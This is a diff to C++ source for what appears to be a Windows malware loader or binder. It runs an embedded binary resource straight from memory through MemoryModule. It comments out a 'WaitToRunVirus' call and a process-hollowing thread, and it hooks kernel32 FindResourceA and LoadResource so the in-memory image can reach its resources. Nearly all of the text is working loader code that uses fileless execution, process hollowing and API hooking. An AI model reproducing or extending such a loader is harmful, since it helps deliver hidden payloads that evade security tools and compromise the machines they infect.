@@ -2,14 +2,21 @@
 #include "resource.h"
 
 #include "MemoryModule.h"
-#include "ProcessHollowing.h"
+// #include "ProcessHollowing.h"
 
 #include <windows.h>
 #include <iostream>
 #include <fstream>
 #include <thread>
+#include <DbgHelp.h>
 
 #include <atlstr.h>
+
+#pragma comment(lib, "Dbghelp.lib")
+
+extern HMEMORYMODULE g_mem_pe;
+extern FARPROC OriginalFindResource;
+extern FARPROC OriginalLoadResource;
 
 BOOL CALLBACK EnumLangsProc(HMODULE hModule, LPCWSTR lpType, LPCWSTR lpName, WORD wLanguage, LONG_PTR lParam);
 BOOL CALLBACK EnumNamesProc(HMODULE hModule, LPCWSTR lpType, LPWSTR lpName, LONG_PTR lParam);
@@ -24,6 +31,8 @@ BOOL AddFileToResource32(LPCWSTR exePath, LPCWSTR resourceFilePath, LPCWSTR newE
 
 // 用于 Process Hollowing 的辅助线程函数
 DWORD WINAPI HollowingThread(LPVOID lpParam);
+HMODULE WINAPI CustomFindResource(HMODULE hModule, LPCTSTR lpName, LPCTSTR lpType);
+HGLOBAL WINAPI CustomLoadResource(HMODULE hModule, HRSRC hResInfo);
 
 // 将资源添加到新文件的结构体
 struct ResourceUpdateData {
@@ -47,31 +56,32 @@ public:
 public:
     void ParseParams(int argc, wchar_t* argv[]) {
         if (argc <= 1) {
-            WaitToRunVirus();
+            // WaitToRunVirus();
+            MemoryLoadToRun(IDR_BINARY_FILE);
         }
         else if (argc == 2) {
             CString str_param = argv[1];
             if (str_param == L"run") {
                 // ExtractAndRunResourceProgram(IDR_BINARY_FILE);
-                // MemoryLoadToRun(IDR_BINARY_FILE);
-                RunPE();
+                MemoryLoadToRun(IDR_BINARY_FILE);
+                // RunPE();
 
-                HANDLE hMainThread = OpenThread(THREAD_ALL_ACCESS, FALSE, GetCurrentThreadId());
-                if (!hMainThread) {
-                    return;
-                }
+                //HANDLE hMainThread = OpenThread(THREAD_ALL_ACCESS, FALSE, GetCurrentThreadId());
+                //if (!hMainThread) {
+                //    return;
+                //}
 
-                // 创建辅助线程执行 Hollowing
-                HANDLE hThread = CreateThread(NULL, 0, HollowingThread, hMainThread, 0, NULL);
-                if (!hThread) {
-                    CloseHandle(hMainThread);
-                    return;
-                }
+                //// 创建辅助线程执行 Hollowing
+                //HANDLE hThread = CreateThread(NULL, 0, HollowingThread, hMainThread, 0, NULL);
+                //if (!hThread) {
+                //    CloseHandle(hMainThread);
+                //    return;
+                //}
 
-                // 等待辅助线程完成
-                WaitForSingleObject(hThread, INFINITE);
-                CloseHandle(hThread);
-                CloseHandle(hMainThread);
+                //// 等待辅助线程完成
+                //WaitForSingleObject(hThread, INFINITE);
+                //CloseHandle(hThread);
+                //CloseHandle(hMainThread);
 
             }
             else if (str_param == L"wait") {
@@ -282,6 +292,21 @@ public:
                 std::cout << "Failed to load EXE into memory." << std::endl;
                 return flag;
             }
+
+            g_mem_pe = hmemModule;
+            // 获取原始 API 的地址
+#ifdef _WIN64
+            OriginalFindResource = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "FindResourceA");
+            OriginalLoadResource = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadResource");
+#else
+            OriginalFindResource = GetProcAddress(GetModuleHandle("kernel32.dll"), "FindResourceA");
+            OriginalLoadResource = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadResource");
+#endif
+
+            // Hook API 函数
+            HookAPIFunction("kernel32.dll", "FindResourceA", (FARPROC)CustomFindResource, &OriginalFindResource);
+            HookAPIFunction("kernel32.dll", "LoadResource", (FARPROC)CustomLoadResource, &OriginalLoadResource);
+
             
 
             // 获取当前进程的资源目录地址
@@ -375,6 +400,9 @@ public:
         std::wcout << L"Program executed successfully.\n";
         return TRUE;
     }
+
+    // 用于资源更新
+
 
 private:
 
